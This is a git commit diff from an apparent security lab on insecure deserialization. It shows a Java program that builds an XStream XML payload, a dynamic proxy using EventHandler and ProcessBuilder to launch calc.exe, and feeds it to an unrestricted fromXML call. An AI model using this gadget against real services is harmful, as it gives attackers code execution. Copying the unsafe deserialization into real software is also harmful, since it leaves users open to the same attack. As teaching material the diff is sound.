b49fde380ba4e668b72e9bd1ad98c843a5fb04c3
Piotr Szyma <thompson2908@gmail.com>
2019-05-22 22:09:48 +0200

    XStream WIP

--- mitmproxy/07_insecure_deserialization/xstream_source/Main.java
+++ mitmproxy/07_insecure_deserialization/xstream_source/Main.java
@@ -5,14 +5,18 @@ import com.thoughtworks.xstream.XStream;
 import com.thoughtworks.xstream.io.xml.StaxDriver;
 
 import contact.Contact;
+import contact.ContactImpl;
 
 public class Main {
   public static void main(String[] args) throws IOException {
-    // File file = new File("test.txt");
-    // file.createNewFile();
-    String xml = "<contact>\n"
+    XStream xstream = new XStream();
+    ContactImpl contact = new ContactImpl();
+    String contactXml = xstream.toXML(contact);
+    ContactImpl contactFromXml = (ContactImpl) xstream.fromXML(contactXml);
+
+    String xml = "<contact.Contact>\n"
     + "<dynamic-proxy>\n" 
-      + "<interface>Contact</interface>"
+      + "<interface>contact.Contact</interface>"
         + "<handler class='java.beans.EventHandler'>"
           + "<target class='java.lang.ProcessBuilder'>"
             + "<command><string>calc.exe</string></command>" 
@@ -20,14 +24,11 @@ public class Main {
           + "<action>start</action>" 
         + "<handler>" 
       + "</dynamic-proxy>" 
-    + "</contact>";
+    + "</contact.Contact>";
 
-    XStream xstream = new XStream();
+    // String contactXmlNew = xstream.toXML(new ContactImpl());
+    // System.out.println(contactXmlNew);
     Contact c = (Contact)xstream.fromXML(xml);
-    String fullName = c.getFullname();
-    // xstream.fromXML("{'void':null}");
-    // String xml = xstream.toXML(person);
-    // // System.out.println(xml);
-    // xstream.alias("person", Person.class);
+    System.out.println(c.getFullname());
   }
 }
--- mitmproxy/07_insecure_deserialization/xstream_source/contact/ContactImpl.java
+++ mitmproxy/07_insecure_deserialization/xstream_source/contact/ContactImpl.java
@@ -1,6 +1,8 @@
 package contact;
 
 public class ContactImpl implements Contact {
+  public int foo = 1;
+
   public String getFullname() {
     return "fullname";
   }
